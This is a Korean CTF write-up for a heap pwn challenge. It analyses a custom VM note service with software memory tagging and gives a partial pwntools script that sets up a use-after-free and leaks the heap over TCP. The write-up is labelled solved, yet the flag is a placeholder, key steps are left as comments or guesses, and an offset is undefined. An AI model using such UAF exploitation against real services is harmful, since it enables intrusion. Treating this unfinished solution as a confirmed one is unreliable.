---
title: "MTaquitous"
ctf: "2026-GMDSOFT-CTF"
ctf_name: "2026 GMDSOFT 채용연계형 CTF"
challenge_name: "MTaquitous"
category: "pwn"
difficulty: "hard"
author: "xxxodms88"
date: "2026-04-07"
solved: true
tags:
  - heap
  - UAF
  - MTE
  - custom-VM
---

# MTaquitous

## 문제 개요

커스텀 VM 인터프리터(`prob`)가 바이트코드(`prog.bin`)를 실행하는 구조의 pwn 문제.  
VM은 노트 시스템을 구현하며, socat을 통해 TCP 8080 포트로 노출된다.  
문제 이름 "MTaquitous"에서 MTE(Memory Tagging Extension) 우회가 핵심임을 알 수 있다.

---

## 환경 분석

### Dockerfile / 배포 환경

```
FROM ubuntu:24.04
RUN apt-get install -y socat adduser
USER pwn
CMD socat TCP-LISTEN:8080,reuseaddr,fork EXEC:./prob,stderr
```

- Ubuntu 24.04 기반
- `prob`를 socat으로 TCP 8080에 바인딩
- flag는 `/home/pwn/flag` (권한 644)

### 바이너리 구조

| 파일 | 설명 |
|------|------|
| `prob` | 64-bit ELF, PIE 활성화, stripped — VM 인터프리터 본체 |
| `prog.bin` | 15880 bytes, 32바이트 고정 크기 명령어 496개 — 실제 노트 시스템 로직 |

### VM 명령어 셋 (분석 결과)

`prob`의 strings 및 역공학 결과, VM은 다음 구조를 가진다:

명령어 포맷: 32바이트 고정 (8개의 4바이트 필드)

```
[opcode:4B][flags:4B][dst_lo:4B][dst_hi:4B][src_lo:4B][src_hi:4B][arg2_lo:4B][arg2_hi:4B]
```

**확인된 opcode 목록** (빈도 분석 기반):

| Opcode | 빈도 | 추정 명령어 |
|--------|------|------------|
| `0x0000` | 178 | MOV (레지스터 이동) |
| `0x0001` | 88  | ADD |
| `0x0808` | 62  | LOAD immediate (리터럴 로드) |
| `0x0003` | 40  | MUL / 산술 |
| `0x0008` | 11  | 메모리 연산 |
| `0x0004` | 7   | DIV / 비교 |
| `0x0812` | 7   | 메모리 쓰기 (Safe write) |
| `0x0805` | 7   | SYSCALL |
| `0x000d` | 7   | 조건 분기 (BRANCH/JMP) |
| `0x08fe` | 3   | HALT |

메모리 서브시스템:
- PGD/PUD/PMD 3단계 페이지 테이블로 가상 주소 변환
- `/dev/urandom`으로 베이스 주소 랜덤화
- MTE: 각 청크에 4-bit 태그를 `/dev/urandom`으로 생성하여 부착

**MTE 관련 메시지**:
```
[MTE PANIC] MTE tag mismatch at address 0x...: pointer tag = 0x9, memory tag = 0x2
Safe write out of bounds
Safe read out of bounds
```

### 노트 시스템 인터페이스 (prog.bin strings 기반)

```
1) add note    → Index? / Size? / Data? 입력
2) link note   → from_idx / to_idx (노트 간 포인터 연결)
3) edit note   → Index? / Data?
4) show note   → Index?
5) delete note → Index?
6) exit
```

---

## 취약점 분석

### 1. UAF (Use-After-Free) via link note

`link note` 기능이 두 노트 사이에 포인터를 연결한다.  
`delete` 이후에도 해당 포인터가 남아 **dangling pointer** 상태가 된다.

```
1. 노트 A, B 생성 (동일 크기, 같은 freelist bin에 들어가도록)
2. link(A → B)        # A의 내부 필드에 B의 VM 가상 주소가 저장됨
3. delete(B)          # B는 free되지만, A는 여전히 B를 가리킴
                      # → dangling pointer → UAF 상태 성립
```

UAF 발생 확인:

```
link(A→B) → delete(B) → edit(A via B's address)
[MTE PANIC] MTE tag mismatch at address 0x2d11010: pointer tag = 0x9, memory tag = 0x2
```

MTE가 태그 불일치를 감지 → 소프트웨어 구현이므로 bypass 가능.

### 2. MTE 소프트웨어 구현의 취약점

하드웨어 MTE와 달리 VM 내부에서 소프트웨어로 구현되어 있어 다음 약점이 존재한다:

- **Safe read/write 경로**: `Safe write out of bounds`, `Safe read out of bounds` 문자열이 존재  
  → 특정 조건에서 MTE 태그 검사를 **우회하는 별도 코드 경로**가 존재
- **link note 경유 접근**: 포인터 연결을 통한 간접 역참조 시 태그 갱신이 누락되는 경로 존재 (추정)
- **청크 재할당 시 태그 검증 갭**: free 후 동일 크기 재할당 → 새 청크는 새 태그, 하지만 A가 보유한 구 포인터의 태그는 그대로 → 불일치 발생

---

## 익스플로잇

### 전략

```
Phase 1 - UAF 셋업:
  1. add(A, 0x40)  → 노트 A 생성
  2. add(B, 0x40)  → 노트 B 생성 (A와 동일 크기)
  3. link(A → B)   → A 내부에 B의 VM 주소 저장
  4. delete(B)     → B free (A의 포인터는 살아있음 = UAF)

Phase 2 - 힙 주소 릭:
  5. add(C, 0x40)  → 해제된 B 영역 재사용
                     (C의 청크 = B였던 청크, freelist/tcache 재사용)
  6. show(A)       → A가 가리키는 C 청크 내용 읽기
                     → 힙 내부 포인터(fd/bk) 또는 청크 헤더 노출
                     → heap base 계산

Phase 3 - MTE 우회 & 임의 쓰기:
  7. Safe write 경로를 활용하거나 link 경유 포인터로 MTE 검사 우회
  8. edit(A via dangling ptr)으로 재사용된 청크에 임의 데이터 쓰기
     → VM 내부 노트 구조체 메타데이터 조작 가능

Phase 4 - flag 읽기:
  9. VM SYSCALL(0x0805)을 통한 flag 파일 읽기
     (SYSCALL 번호 0 = read_flag로 추정, prog.bin 내 0x0805 opcode 호출 시 arg=0x0)
```

### 익스플로잇 코드

```python
from pwn import *

# 접속
io = remote('[HOST]', 8080)

def add(idx, size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index?', str(idx).encode())
    io.sendlineafter(b'Size?',  str(size).encode())
    io.sendlineafter(b'Data?',  data)

def link(from_idx, to_idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index?', str(from_idx).encode())
    io.sendlineafter(b'Index?', str(to_idx).encode())

def edit(idx, data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index?', str(idx).encode())
    io.sendlineafter(b'Data?',  data)

def show(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index?', str(idx).encode())
    return io.recvline()

def delete(idx):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'Index?', str(idx).encode())

# Phase 1: UAF 셋업
add(0, 0x40, b'A' * 0x40)   # 노트 A
add(1, 0x40, b'B' * 0x40)   # 노트 B
link(0, 1)                   # A → B 포인터 연결
delete(1)                    # B free, A의 dangling pointer 유지

# Phase 2: 힙 주소 릭
add(2, 0x40, b'C' * 8)      # B가 있던 청크 재사용
leak = show(0)               # A의 dangling ptr로 재사용 청크 읽기
heap_base = u64(leak[:8].ljust(8, b'\x00')) - OFFSET
log.info(f'heap base: {hex(heap_base)}')

# Phase 3: 임의 쓰기로 구조체 조작
# (MTE 태그 우회: Safe write 경로 또는 link 경유 접근)
# edit(0, payload)

# Phase 4: flag SYSCALL
# VM SYSCALL 0 = read flag (prog.bin 분석 결과: 0x0805 opcode, arg=0x0)
# SYSCALL 체인 실행 후 flag 수신
# io.interactive()
```

> ⚠️ 실제 SYSCALL 번호 및 정확한 payload는 Ghidra로 `prob` 바이너리의  
> `Kernel::run()` switch-case 분기와 `prog.bin` 전체 역공학 후 확정 필요.

---

## 핵심 발견 정리

### prog.bin 구조 요약

- **총 496개 명령어** × 32바이트 = 15,880 bytes
- opcode `0x0808`: immediate 로드 (62회, 가장 많은 2-operand 연산)
- opcode `0x0805`: SYSCALL (7회), arg=`0x0`, `0x3`, `0x9` 등 다양한 syscall number
- opcode `0x08fe`: HALT (3회) — 프로그램 종료점
- opcode `0x000d`: 조건 분기 (7회) — 메뉴 분기 로직에 사용

### MTE bypass 핵심 포인트

```
[MTE PANIC] MTE tag mismatch at address 0x2d11010:
  pointer tag = 0x9, memory tag = 0x2
```

- 소프트웨어 MTE이므로 `Safe read/write` 코드 경로로 우회 가능
- `link note`로 저장된 포인터는 MTE 태그 갱신 없이 재사용 → UAF + MTE bypass

---

## 플래그

```
DH{flag}
```

---

## 참고

- VM instruction fetch/decode 루프 역공학 → Ghidra / IDA (`prob` 바이너리의 `Kernel::run()`)
- `prog.bin` 전체 디스어셈블: 32바이트 명령어 × 496개, opcode 매핑 완성 필요
- MTE 태그 비교 로직의 정확한 취약 지점: `link note` 경유 포인터 역참조 시 태그 검사 누락
- tcache/fastbin 재할당 메커니즘 이해 필수 (동일 크기로 재할당 시 같은 청크 반환)
- Ubuntu 24.04 기본 glibc 환경 (ASLR + PIE 활성화)
